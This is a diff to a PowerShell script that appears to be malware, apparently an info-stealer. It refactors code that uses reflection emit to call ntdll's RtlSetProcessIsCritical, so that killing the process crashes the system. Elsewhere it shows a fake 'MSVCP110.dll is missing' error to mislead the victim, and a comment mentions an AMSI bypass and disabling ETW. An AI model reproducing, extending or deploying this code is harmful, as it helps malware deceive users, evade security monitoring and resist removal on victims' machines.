@@ -23,6 +23,24 @@ else {
 # Load WPF assemblies
 Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing
 
+
+
+# Critical Process
+[System.Diagnostics.Process]::EnterDebugMode()
+$domain = [AppDomain]::CurrentDomain
+$name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
+$assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+$module = $assembly.DefineDynamicModule('DynamicModule')
+$typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
+$methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical','ntdll.dll',
+[System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
+[System.Runtime.InteropServices.CallingConvention]::Winapi,[void],[System.Type[]]@([uint32], [uint32], [uint32]),
+[System.Runtime.InteropServices.CallingConvention]::Winapi,
+[System.Runtime.InteropServices.CharSet]::Ansi)
+$type = $typeBuilder.CreateType()
+$methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
+function InvokeRtlSetProcessIsCritical {param ([uint32]$isCritical,[uint32]$unknown1,[uint32]$unknown2)$methodInfo.Invoke($null, @($isCritical, $unknown1, $unknown2))}
+
 function KDMUTEX {
     if ($fakeerror) {
         [Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error')
@@ -34,26 +52,12 @@ function KDMUTEX {
         throw "[!] An instance of this script is already running."
     }
     elseif ($criticalprocess -and -not $debug) {
-        CRITICAL_PROCESS
+        InvokeRtlSetProcessIsCritical 1 $null $null	
     }
     Invoke-TASKS
 }
 
-function CRITICAL_PROCESS {
-    [System.Diagnostics.Process]::EnterDebugMode()
-    $domain = [AppDomain]::CurrentDomain
-    $name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
-    $assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
-    $module = $assembly.DefineDynamicModule('DynamicModule')
-    $typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
-    $methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical','ntdll.dll',
-    [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
-    [System.Runtime.InteropServices.CallingConvention]::Winapi,[void],[System.Type[]]@([uint32], [uint32], [uint32]),
-    [System.Runtime.InteropServices.CallingConvention]::Winapi,[System.Runtime.InteropServices.CharSet]::Ansi)
-    $type = $typeBuilder.CreateType()
-    $methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
-    $methodInfo.Invoke($null, @([uint32]1, [uint32]0, [uint32]0))
-}
+
 
 
 # Request admin with AMSI bypass and ETW Disable
@@ -1139,7 +1143,7 @@ function Backup-Data {
 if (CHECK_AND_PATCH -eq $true) {  
     KDMUTEX
     if (!($debug)) {
-        $methodInfo.Invoke($null, @([uint32]0, [uint32]0, [uint32]0))
+        InvokeRtlSetProcessIsCritical 0 0 0
     }
     $script:SingleInstanceEvent.Close()
     $script:SingleInstanceEvent.Dispose()
